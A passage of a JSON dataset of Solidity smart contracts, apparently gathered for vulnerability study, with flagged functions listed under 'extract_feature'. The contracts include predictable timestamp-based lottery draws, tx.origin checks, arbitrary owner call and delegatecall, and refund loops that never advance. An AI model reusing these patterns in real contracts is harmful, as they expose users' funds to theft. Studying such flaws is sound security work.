bids_decrypted[bids_decrypted_count] = _index;\n bids_decrypted_count++;\n if(bids_decrypted_count == bids_count){\n emit Decrypted(block.number, bids_decrypted_count.sub(bids_burned_count), bids_burned_count);\n status = state.decrypted;\n }\n }\n function appendDecryptedBids(uint[] _nonce, uint[] _index, uint[] _bid_id, address[] _investor_address, uint[] _share_price, uint[] _shares_count, uint[] _transfered_token) public onlyOwner {\n require(_nonce.length == _index.length);\n require(_index.length == _bid_id.length);\n require(_bid_id.length == _investor_address.length);\n require(_investor_address.length == _share_price.length);\n require(_share_price.length == _shares_count.length);\n require(_shares_count.length == _transfered_token.length);\n require(bids_count.sub(bids_decrypted_count) > 0);\n for (uint i = 0; i < _index.length; i++){\n appendDecryptedBid(_nonce[i], _index[i], _bid_id[i], _investor_address[i], _share_price[i], _shares_count[i], _transfered_token[i]);\n }\n }\n function resetAppendDecryptedBids(uint _count) public onlyOwner{\n require(status == state.ended);\n require(bids_decrypted_count > 0);\n require(_count > 0);\n if (bids_reset_count == 0){\n bids_reset_count = bids_decrypted_count;\n }\n uint count = _count;\n if(bids_reset_count < count){\n count = bids_reset_count;\n }\n do {\n bids_reset_count--;\n bids[bids_decrypted[bids_reset_count]].is_decrypted = false;\n bids[bids_decrypted[bids_reset_count]].is_burned = false;\n bids[bids_decrypted[bids_reset_count]].will_compute = false;\n count--;\n } while(count > 0);\n if (bids_reset_count == 0){\n bids_sorted_count = 0;\n bids_ignored_count = 0;\n bids_decrypted_count = 0;\n bids_burned_count = 0;\n }\n }\n function computeBids(uint _count) public onlyOwner{\n require(status == state.decrypted);\n require(_count > 0);\n uint count = _count;\n if (bids_sorted_count == 0){\n status = state.failure;\n emit Failure(0, 0);\n return;\n }\n require(bids_computed_cursor < bids_sorted_count);\n BidData memory bid;\n do{\n bid = bids_sorted[bids_computed_cursor];\n if (bid.share_price.mul(computed_shares_sold).add(bid.share_price) > fundraise_max){\n if(bids_computed_cursor > 0){\n bids_computed_cursor--;\n }\n bid = bids_sorted[bids_computed_cursor];\n break;\n }\n computed_shares_sold = computed_shares_sold.add(bid.shares_count);\n computed_fundraise = bid.share_price.mul(computed_shares_sold);\n emit Computed(bid.origin_index, bid.share_price, bid.shares_count);\n bids_computed_cursor++;\n count--;\n }while(\n count > 0 &&\n bids_computed_cursor < bids_sorted_count &&\n (\n computed_fundraise < fundraise_max &&\n computed_shares_sold < max_shares_to_sell\n )\n );\n if (\n bids_computed_cursor == bids_sorted_count ||\n computed_fundraise >= fundraise_max ||\n computed_shares_sold >= max_shares_to_sell\n ){\n final_share_price = bid.share_price;\n if(computed_shares_sold >= max_shares_to_sell){\n computed_shares_sold = max_shares_to_sell;\n computed_fundraise = final_share_price.mul(computed_shares_sold);\n winner_bids = bids_computed_cursor;\n status = state.success;\n emit Success(computed_fundraise, final_share_price, computed_shares_sold);\n return;\n }\n if(computed_fundraise.add(final_share_price.mul(1)) >= fundraise_max){\n computed_fundraise = fundraise_max;\n winner_bids = bids_computed_cursor;\n status = state.success;\n emit Success(computed_fundraise, final_share_price, computed_shares_sold);\n return;\n }\n if (bids_computed_cursor == bids_sorted_count){\n if (computed_shares_sold >= min_shares_to_sell){\n winner_bids = bids_computed_cursor;\n status = state.success;\n emit Success(computed_fundraise, final_share_price, computed_shares_sold);\n return;\n }else{\n status = state.failure;\n emit Failure(computed_fundraise, final_share_price);\n return;\n }\n }\n }\n }\n function convert_valuation_to_art(uint _valuation, uint _art_price) view public returns(uint amount){\n amount = ((\n _valuation.mul(oracle_price_decimals_factor)\n ).div(\n _art_price\n )).mul(decimal_precission_difference_factor);\n }\n function refundIgnoredBids(uint _count) public onlyOwner{\n require(status == state.success || status == state.failure);\n uint count = _count;\n if(bids_ignored_count < bids_ignored_refunded.add(count)){\n count = bids_ignored_count.sub(bids_ignored_refunded);\n }\n require(count > 0);\n uint cursor = bids_ignored_refunded;\n bids_ignored_refunded = bids_ignored_refunded.add(count);\n BidData storage bid;\n while (count > 0) {\n bid = bids_ignored[cursor];\n if(bid.closed){\n continue;\n }\n bid.closed = true;\n art_token_contract.transfer(bid.investor_address, bid.transfer_token);\n emit Refunded(bid.origin_index, bid.transfer_token);\n cursor ++;\n count --;\n }\n }\n function refundLosersBids(uint _count) public onlyOwner{\n require(status == state.success || status == state.failure);\n uint count = _count;\n if(bids_sorted_count.sub(winner_bids) < bids_sorted_refunded.add(count)){\n count = bids_sorted_count.sub(winner_bids).sub(bids_sorted_refunded);\n }\n require(count > 0);\n uint cursor = bids_sorted_refunded.add(winner_bids);\n bids_sorted_refunded = bids_sorted_refunded.add(count);\n BidData memory bid;\n while (count > 0) {\n bid = bids_sorted[cursor];\n if(bid.closed){\n continue;\n }\n bids_sorted[cursor].closed = true;\n art_token_contract.transfer(bid.investor_address, bid.transfer_token);\n emit Refunded(bid.origin_index, bid.transfer_token);\n cursor ++;\n count --;\n }\n }\n function calculate_shares_and_return(uint _shares_count, uint _share_price, uint _transfer_valuation, uint _final_share_price, uint _art_price, uint transfer_token) view public\n returns(\n uint _shares_to_assign,\n uint _executed_amount_valuation,\n uint _return_amount\n ){\n if(assigned_shares.add(_shares_count) > max_shares_to_sell){\n _shares_to_assign = max_shares_to_sell.sub(assigned_shares);\n }else{\n _shares_to_assign = _shares_count;\n }\n _executed_amount_valuation = _shares_to_assign.mul(_final_share_price);\n if (final_fundraise.add(_executed_amount_valuation) > fundraise_max){\n _executed_amount_valuation = fundraise_max.sub(final_fundraise);\n _shares_to_assign = _executed_amount_valuation.div(_final_share_price);\n _executed_amount_valuation = _shares_to_assign.mul(_final_share_price);\n }\n uint _executed_amount = convert_valuation_to_art(_executed_amount_valuation, _art_price);\n _return_amount = transfer_token.sub(_executed_amount);\n }\n function assignShareTokens(uint _count) public onlyOwner{\n require(status == state.success);\n uint count = _count;\n if(winner_bids < assigned_bids.add(count)){\n count = winner_bids.sub(assigned_bids);\n }\n require(count > 0);\n uint cursor = assigned_bids;\n assigned_bids = assigned_bids.add(count);\n BidData storage bid;\n while (count > 0) {\n bid = bids_sorted[cursor];\n uint _shares_to_assign;\n uint _executed_amount_valuation;\n uint _return_amount;\n (_shares_to_assign, _executed_amount_valuation, _return_amount) = calculate_shares_and_return(\n bid.shares_count,\n bid.share_price,\n bid.transfer_valuation,\n final_share_price,\n bids[bid.origin_index].art_price,\n bid.transfer_token\n );\n bid.executed_amount = _executed_amount_valuation;\n bid.asigned_shares_count = _shares_to_assign;\n assigned_shares = assigned_shares.add(_shares_to_assign);\n final_fundraise = final_fundraise.add(_executed_amount_valuation);\n final_shares_sold = final_shares_sold.add(_shares_to_assign);\n if(_return_amount > 0){\n art_token_contract.transfer(bid.investor_address, _return_amount);\n }\n bid.closed = true;\n if (shares_holders_balance[bid.investor_address] == 0){\n shares_holders[shares_holders_count++] = bid.investor_address;\n }\n emit Assigned(bid.origin_index,_shares_to_assign, _executed_amount_valuation, _return_amount);\n shares_holders_balance[bid.investor_address] = shares_holders_balance[bid.investor_address].add(_shares_to_assign);\n cursor ++;\n count --;\n }\n }\n function getShareBalance() view public returns (uint256 share_balance){\n require(status == state.success);\n require(winner_bids == assigned_bids);\n share_balance = shares_holders_balance[msg.sender];\n }\n function reclaimToken(ERC20Basic token) external onlyOwner {\n require(token != art_token_contract);\n uint256 balance = token.balanceOf(this);\n token.transfer(owner, balance);\n }\n function reclaim_art_token() external onlyOwner {\n require(status == state.success || status == state.failure);\n require(winner_bids == assigned_bids);\n uint256 balance = art_token_contract.balanceOf(this);\n art_token_contract.transfer(owner, balance);\n }\n function executeTransaction(\n address destination,\n uint value,\n bytes data\n )\n public\n onlyOwner\n {\n if (destination.call.value(value)(data))\n emit Execution(destination,value,data);\n else\n emit ExecutionFailure(destination,value,data);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function startAuction() public onlyOwner{\nrequire(status == state.pending);\nstatus = state.active;\nemit Started(block.number);\n}",
    "function endAuction() public onlyOwner{\nrequire(status == state.active);\nstatus = state.ended;\nemit Ended(block.number);\n}",
    "function appendDecryptedBid(uint _nonce, uint _index, uint _bid_id, address _investor_address, uint _share_price, uint _shares_count, uint _transfered_token) onlyOwner public {\nrequire(status == state.ended);\nrequire(fundraise_defined);\nrequire(bids[_index].exist == true);\nrequire(bids[_index].is_decrypted == false);\nrequire(bids[_index].is_burned == false);\nrequire(_share_price > 0);\nrequire(_shares_count > 0);\nrequire(_transfered_token >= convert_valuation_to_art(_shares_count.mul(_share_price),bids[_index].art_price));\nif (bids_sorted_count > 0){\nBidData memory previous_bid_data = bids_sorted[bids_sorted_count-1];\nrequire(_share_price <= previous_bid_data.share_price);\nif (_share_price == previous_bid_data.share_price){\nrequire(_index > previous_bid_data.origin_index);\n}\n}\nrequire(\ngetBidHash(_nonce, _bid_id,_investor_address,_share_price,_shares_count) == bids[_index].bid_hash\n);\nuint _transfer_amount = _share_price.mul(_shares_count);\nBidData memory bid_data = BidData(_index, _bid_id, _investor_address, _share_price, _shares_count, _transfer_amount, _transfered_token, 0, 0, false);\nbids[_index].is_decrypted = true;\nif (_share_price >= min_share_price){\nbids[_index].will_compute = true;\nbids_sorted[bids_sorted_count] = bid_data;\nbids_sorted_count++;\nemit BidDecrypted(_index,true);\n}else{\nbids[_index].will_compute = false;\nbids_ignored[bids_ignored_count] = bid_data;\nbids_ignored_count++;\nemit BidDecrypted(_index,false);\n}\nbids_decrypted[bids_decrypted_count] = _index;\nbids_decrypted_count++;\nif(bids_decrypted_count == bids_count){\nemit Decrypted(block.number, bids_decrypted_count.sub(bids_burned_count), bids_burned_count);\nstatus = state.decrypted;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b3c"
  },
  "filename": "2025.sol",
  "content": "contract Ambi {\n function getNodeAddress(bytes32 _nodeName) constant returns(address);\n function hasRelation(bytes32 _nodeName, bytes32 _relation, address _to) constant returns(bool);\n function addNode(bytes32 _nodeName, address _nodeAddress) constant returns(bool);\n}\ncontract AmbiEnabled {\n Ambi public ambiC;\n bool public isImmortal;\n bytes32 public name;\n modifier checkAccess(bytes32 _role) {\n if(address(ambiC) != 0x0 && ambiC.hasRelation(name, _role, msg.sender)){\n _\n }\n }\n function getAddress(bytes32 _name) constant returns (address) {\n return ambiC.getNodeAddress(_name);\n }\n function setAmbiAddress(address _ambi, bytes32 _name) returns (bool){\n if(address(ambiC) != 0x0){\n return false;\n }\n Ambi ambiContract = Ambi(_ambi);\n if(ambiContract.getNodeAddress(_name)!=address(this)) {\n if (!ambiContract.addNode(_name, address(this))){\n return false;\n }\n }\n name = _name;\n ambiC = ambiContract;\n return true;\n }\n function immortality() checkAccess(\"owner\") returns(bool) {\n isImmortal = true;\n return true;\n }\n function remove() checkAccess(\"owner\") returns(bool) {\n if (isImmortal) {\n return false;\n }\n selfdestruct(msg.sender);\n return true;\n }\n}\nlibrary StackDepthLib {\n uint constant GAS_PER_DEPTH = 400;\n function checkDepth(address self, uint n) constant returns(bool) {\n if (n == 0) return true;\n return self.call.gas(GAS_PER_DEPTH * n)(0x21835af6, n - 1);\n }\n function __dig(uint n) constant {\n if (n == 0) return;\n if (!address(this).delegatecall(0x21835af6, n - 1)) throw;\n }\n}\ncontract Safe {\n modifier noValue {\n if (msg.value > 0) {\n _safeSend(msg.sender, msg.value);\n }\n _\n }\n modifier onlyHuman {\n if (_isHuman()) {\n _\n }\n }\n modifier noCallback {\n if (!isCall) {\n _\n }\n }\n modifier immutable(address _address) {\n if (_address == 0) {\n _\n }\n }\n address stackDepthLib;\n function setupStackDepthLib(address _stackDepthLib) immutable(address(stackDepthLib)) returns(bool) {\n stackDepthLib = _stackDepthLib;\n return true;\n }\n modifier requireStackDepth(uint16 _depth) {\n if (stackDepthLib == 0x0) {\n throw;\n }\n if (_depth > 1023) {\n throw;\n }\n if (!stackDepthLib.delegatecall(0x32921690, stackDepthLib, _depth)) {\n throw;\n }\n _\n }\n function _safeFalse() internal noValue() returns(bool) {\n return false;\n }\n function _safeSend(address _to, uint _value) internal {\n if (!_unsafeSend(_to, _value)) {\n throw;\n }\n }\n function _unsafeSend(address _to, uint _value) internal returns(bool) {\n return _to.call.value(_value)();\n }\n function _isContract() constant internal returns(bool) {\n return msg.sender != tx.origin;\n }\n function _isHuman() constant internal returns(bool) {\n return !_isContract();\n }\n bool private isCall = false;\n function _setupNoCallback() internal {\n isCall = true;\n }\n function _finishNoCallback() internal {\n isCall = false;\n }\n}\ncontract EventsHistory is AmbiEnabled, Safe {\n mapping(bytes4 => address) public emitters;\n mapping(address => uint) public versions;\n mapping(uint => VersionInfo) public versionInfo;\n uint public latestVersion;\n struct VersionInfo {\n uint block;\n address by;\n address caller;\n string name;\n string changelog;\n }\n function addEmitter(bytes4 _eventSignature, address _emitter) noValue() checkAccess(\"admin\") returns(bool) {\n if (emitters[_eventSignature] != 0x0) {\n return false;\n }\n emitters[_eventSignature] = _emitter;\n return true;\n }\n function addVersion(address _caller, string _name, string _changelog) noValue() checkAccess(\"admin\") returns(bool) {\n if (versions[_caller] != 0) {\n return false;\n }\n if (bytes(_name).length == 0) {\n return false;\n }\n if (bytes(_changelog).length == 0) {\n return false;\n }\n uint version = ++latestVersion;\n versions[_caller] = version;\n versionInfo[version] = VersionInfo(block.number, msg.sender, _caller, _name, _changelog);\n return true;\n }\n function () noValue() {\n if (versions[msg.sender] == 0) {\n return;\n }\n if (!emitters[msg.sig].delegatecall(msg.data)) {\n throw;\n }\n }\n}",
  "extract_feature": [
    "function addVersion(address _caller, string _name, string _changelog) noValue() checkAccess(\"admin\") returns(bool) {\nif (versions[_caller] != 0) {\nreturn false;\n}\nif (bytes(_name).length == 0) {\nreturn false;\n}\nif (bytes(_changelog).length == 0) {\nreturn false;\n}\nuint version = ++latestVersion;\nversions[_caller] = version;\nversionInfo[version] = VersionInfo(block.number, msg.sender, _caller, _name, _changelog);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b3d"
  },
  "filename": "2110.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary utils{\n function inArray(uint[] _arr,uint _val) internal pure returns(bool){\n for(uint _i=0;_i< _arr.length;_i++){\n if(_arr[_i]==_val){\n return true;\n break;\n }\n }\n return false;\n }\n function inArray(address[] _arr,address _val) internal pure returns(bool){\n for(uint _i=0;_i< _arr.length;_i++){\n if(_arr[_i]==_val){\n return true;\n break;\n }\n }\n return false;\n }\n}\ncontract Ownable {\n address public owner;\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n owner = newOwner;\n }\n}\ncontract GuessEthEvents{\n event drawLog(uint,uint,uint);\n event guessEvt(\n address indexed playerAddr,\n uint[] numbers, uint amount\n );\n event winnersEvt(\n uint blockNumber,\n address indexed playerAddr,\n uint amount,\n uint winAmount\n );\n event withdrawEvt(\n address indexed to,\n uint256 value\n );\n event drawEvt(\n uint indexed blocknumberr,\n uint number\n );\n event sponseEvt(\n address indexed addr,\n uint amount\n );\n event pauseGameEvt(\n bool pause\n );\n event setOddsEvt(\n uint odds\n );\n}\ncontract GuessEth is Ownable,GuessEthEvents{\n using SafeMath for uint;\n struct bnumber{\n address addr;\n uint number;\n uint value;\n int8 result;\n uint prize;\n }\n mapping(uint => bnumber[]) public bets;\n mapping(uint => address) public betNumber;\n mapping(address => uint[]) private playerBetBNumber;\n struct winner{\n bool result;\n uint prize;\n }\n mapping(uint => winner[]) private winners;\n mapping(uint => uint) private winResult;\n address private wallet1;\n address private wallet2;\n uint private predictBlockInterval=3;\n uint public odds=30;\n uint public blockInterval=500;\n uint public curOpenBNumber=0;\n uint public numberRange=100;\n bool public gamePaused=false;\n mapping(address => uint) Sponsors;\n uint public balanceOfSPS=0;\n address[] public SponsorAddresses;\n uint reservefund=30 ether;\n modifier isHuman() {\n address _addr = msg.sender;\n uint256 _codeLength;\n assembly {_codeLength := extcodesize(_addr)}\n require(_codeLength == 0, \"sorry humans only\");\n _;\n }\n constructor(address _wallet1,address _wallet2) public{\n wallet1=_wallet1;\n wallet2=_wallet2;\n curOpenBNumber=blockInterval*(block.number.div(blockInterval));\n }\n function pauseGame(bool _status) public onlyOwner returns(bool){\n gamePaused=_status;\n emit pauseGameEvt(_status);\n }\n function setOdds(uint _odds) isHuman() public onlyOwner returns(bool){\n odds = _odds;\n emit setOddsEvt(_odds);\n }\n function setReservefund(uint _reservefund) isHuman() public onlyOwner returns(bool){\n reservefund = _reservefund * 1 ether;\n }\n function getTargetBNumber() view isHuman() public returns(uint){\n uint n;\n n=blockInterval*(predictBlockInterval + block.number/blockInterval);\n return n;\n }\n function guess(uint[] _numbers) payable isHuman() public returns(uint){\n require(msg.value >= _numbers.length * 0.05 ether);\n uint n=blockInterval*(predictBlockInterval + block.number/blockInterval);\n for(uint _i=0;_i < _numbers.length;_i++){\n bnumber memory b;\n b.addr=msg.sender;\n b.number=_numbers[_i];\n b.value=msg.value/_numbers.length;\n b.result=-1;\n bets[n].push(b);\n }\n if(utils.inArray(playerBetBNumber[msg.sender],n)==false){\n playerBetBNumber[msg.sender].push(n);\n }\n emit guessEvt(msg.sender,_numbers, msg.value);\n return _numbers.length;\n }\n function getPlayerGuessNumbers() view public returns (uint[],uint[],uint256[],int8[],uint[]){\n uint _c=0;\n uint _i=0;\n uint _j=0;\n uint _bnumber;\n uint limitRows=100;\n while(_i < playerBetBNumber[msg.sender].length){\n _bnumber=playerBetBNumber[msg.sender][_i];\n for(_j=0 ; _j < bets[_bnumber].length && _c < limitRows ; _j++){\n if(msg.sender==bets[_bnumber][_j].addr){\n _c++;\n }\n }\n _i++;\n }\n uint[] memory _blockNumbers=new uint[](_c);\n uint[] memory _numbers=new uint[](_c);\n uint[] memory _values=new uint[](_c);\n int8[] memory _result=new int8[](_c);\n uint[] memory _prize=new uint[](_c);\n if(_c<=0){\n return(_blockNumbers,_numbers,_values,_result,_prize);\n }\n uint _count=0;\n for(_i=0 ; _i < playerBetBNumber[msg.sender].length ; _i++){\n _bnumber=playerBetBNumber[msg.sender][_i];\n for(_j=0 ; _j < bets[_bnumber].length && _count < limitRows ; _j++){\n if(bets[_bnumber][_j].addr == msg.sender){\n _blockNumbers[_count] = _bnumber;\n _numbers[_count] = bets[_bnumber][_j].number;\n _values[_count] = bets[_bnumber][_j].value;\n _result[_count] = bets[_bnumber][_j].result;\n _prize[_count] = bets[_bnumber][_j].prize;\n _count++;\n }\n }\n }\n return(_blockNumbers,_numbers,_values,_result,_prize);\n }\n function draw(uint _blockNumber,uint _blockTimestamp) public onlyOwner returns (uint){\n require(block.number >= curOpenBNumber + blockInterval);\n curOpenBNumber=_blockNumber;\n uint result=_blockTimestamp % numberRange;\n winResult[_blockNumber]=result;\n for(uint _i=0;_i < bets[_blockNumber].length;_i++){\n if(bets[_blockNumber][_i].number==result){\n bets[_blockNumber][_i].result = 1;\n bets[_blockNumber][_i].prize = bets[_blockNumber][_i].value * odds;\n emit winnersEvt(_blockNumber,bets[_blockNumber][_i].addr,bets[_blockNumber][_i].value,bets[_blockNumber][_i].prize);\n withdraw(bets[_blockNumber][_i].addr,bets[_blockNumber][_i].prize);\n }else{\n bets[_blockNumber][_i].result = 0;\n bets[_blockNumber][_i].prize = 0;\n }\n }\n emit drawEvt(_blockNumber,curOpenBNumber);\n return result;\n }\n function getWinners(uint _blockNumber) view public returns(address[],uint[]){\n uint _count=winners[_blockNumber].length;\n address[] memory _addresses = new address[](_count);\n uint[] memory _prize = new uint[](_count);\n uint _i=0;\n for(_i=0;_i<_count;_i++){\n _prize[_i] = winners[_blockNumber][_i].prize;\n }\n return (_addresses,_prize);\n }\n function getWinResults(uint _blockNumber) view public returns(uint){\n return winResult[_blockNumber];\n }\n function withdraw(address _to,uint amount) public onlyOwner returns(bool){\n require(address(this).balance.sub(amount) > 0);\n _to.transfer(amount);\n emit withdrawEvt(_to,amount);\n return true;\n }\n function invest() isHuman payable public returns(uint){\n require(msg.value >= 1 ether,\"Minima amoun:1 ether\");\n Sponsors[msg.sender] = Sponsors[msg.sender].add(msg.value);\n balanceOfSPS = balanceOfSPS.add(msg.value);\n if(!utils.inArray(SponsorAddresses,msg.sender)){\n SponsorAddresses.push(msg.sender);\n emit sponseEvt(msg.sender,msg.value);\n }\n return Sponsors[msg.sender];\n }\n function distribute() public onlyOwner{\n if(address(this).balance < reservefund){\n return;\n }\n uint availableProfits=address(this).balance.sub(reservefund);\n uint prft1=availableProfits.mul(3 ether).div(10 ether);\n uint prft2=availableProfits.sub(prft1);\n uint _val=0;\n uint _i=0;\n for(_i=0;_i<SponsorAddresses.length;_i++){\n _val = (prft1 * Sponsors[SponsorAddresses[_i]]) / (balanceOfSPS);\n SponsorAddresses[_i].transfer(_val);\n }\n uint w1p=prft2.mul(3 ether).div(10 ether);\n wallet1.transfer(w1p);\n wallet2.transfer(prft2.sub(w1p));\n }\n function sharesOfSPS() view public returns(uint,uint){\n return (Sponsors[msg.sender],balanceOfSPS);\n }\n function getAllSponsors() view public returns(address[],uint[],uint){\n uint _i=0;\n uint _c=0;\n for(_i=0;_i<SponsorAddresses.length;_i++){\n _c+=1;\n }\n address[] memory addrs=new address[](_c);\n uint[] memory amounts=new uint[](_c);\n for(_i=0;_i<SponsorAddresses.length;_i++){\n addrs[_i]=SponsorAddresses[_i];\n amounts[_i]=Sponsors[SponsorAddresses[_i]];\n }\n return(addrs,amounts,balanceOfSPS);\n }\n function() payable isHuman() public {\n }\n}",
  "extract_feature": [
    "function getTargetBNumber() view isHuman() public returns(uint){\nuint n;\nn=blockInterval*(predictBlockInterval + block.number/blockInterval);\nreturn n;\n}",
    "function guess(uint[] _numbers) payable isHuman() public returns(uint){\nrequire(msg.value >= _numbers.length * 0.05 ether);\nuint n=blockInterval*(predictBlockInterval + block.number/blockInterval);\nfor(uint _i=0;_i < _numbers.length;_i++){\nbnumber memory b;\nb.addr=msg.sender;\nb.number=_numbers[_i];\nb.value=msg.value/_numbers.length;\nb.result=-1;\nbets[n].push(b);\n}\nif(utils.inArray(playerBetBNumber[msg.sender],n)==false){\nplayerBetBNumber[msg.sender].push(n);\n}\nemit guessEvt(msg.sender,_numbers, msg.value);\nreturn _numbers.length;\n}",
    "function draw(uint _blockNumber,uint _blockTimestamp) public onlyOwner returns (uint){\nrequire(block.number >= curOpenBNumber + blockInterval);\ncurOpenBNumber=_blockNumber;\nuint result=_blockTimestamp % numberRange;\nwinResult[_blockNumber]=result;\nfor(uint _i=0;_i < bets[_blockNumber].length;_i++){\nif(bets[_blockNumber][_i].number==result){\nbets[_blockNumber][_i].result = 1;\nbets[_blockNumber][_i].prize = bets[_blockNumber][_i].value * odds;\nemit winnersEvt(_blockNumber,bets[_blockNumber][_i].addr,bets[_blockNumber][_i].value,bets[_blockNumber][_i].prize);\nwithdraw(bets[_blockNumber][_i].addr,bets[_blockNumber][_i].prize);\n}else{\nbets[_blockNumber][_i].result = 0;\nbets[_blockNumber][_i].prize = 0;\n}\n}\nemit drawEvt(_blockNumber,curOpenBNumber);\nreturn result;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b3e"
  },
  "filename": "2130.sol",
  "content": "pragma solidity 0.4.19;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Multivest is Ownable {\n using SafeMath for uint256;\n mapping (address => bool) public allowedMultivests;\n event MultivestSet(address multivest);\n event MultivestUnset(address multivest);\n event Contribution(address holder, uint256 value, uint256 tokens);\n modifier onlyAllowedMultivests(address _addresss) {\n require(allowedMultivests[_addresss] == true);\n _;\n }\n function Multivest() public {}\n function setAllowedMultivest(address _address) public onlyOwner {\n allowedMultivests[_address] = true;\n MultivestSet(_address);\n }\n function unsetAllowedMultivest(address _address) public onlyOwner {\n allowedMultivests[_address] = false;\n MultivestUnset(_address);\n }\n function multivestBuy(address _address, uint256 _value) public onlyAllowedMultivests(msg.sender) {\n require(buy(_address, _value) == true);\n }\n function multivestBuy(\n address _address,\n uint8 _v,\n bytes32 _r,\n bytes32 _s\n ) public payable onlyAllowedMultivests(verify(keccak256(msg.sender), _v, _r, _s)) {\n require(_address == msg.sender && buy(msg.sender, msg.value) == true);\n }\n function verify(bytes32 _hash, uint8 _v, bytes32 _r, bytes32 _s) internal pure returns (address) {\n bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\n return ecrecover(keccak256(prefix, _hash), _v, _r, _s);\n }\n function buy(address _address, uint256 _value) internal returns (bool);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract GigERC20 is StandardToken, Ownable {\n uint256 public creationBlock;\n uint8 public decimals;\n string public name;\n string public symbol;\n string public standard;\n bool public locked;\n function GigERC20(\n uint256 _totalSupply,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transferAllSupplyToOwner,\n bool _locked\n ) public {\n standard = \"ERC20 0.1\";\n locked = _locked;\n totalSupply_ = _totalSupply;\n if (_transferAllSupplyToOwner) {\n balances[msg.sender] = totalSupply_;\n } else {\n balances[this] = totalSupply_;\n }\n name = _tokenName;\n symbol = _tokenSymbol;\n decimals = _decimalUnits;\n creationBlock = block.number;\n }\n function setLocked(bool _locked) public onlyOwner {\n locked = _locked;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(locked == false);\n return super.transfer(_to, _value);\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n if (locked) {\n return false;\n }\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool success) {\n if (locked) {\n return false;\n }\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool success) {\n if (locked) {\n return false;\n }\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n function transferFrom(address _from, address 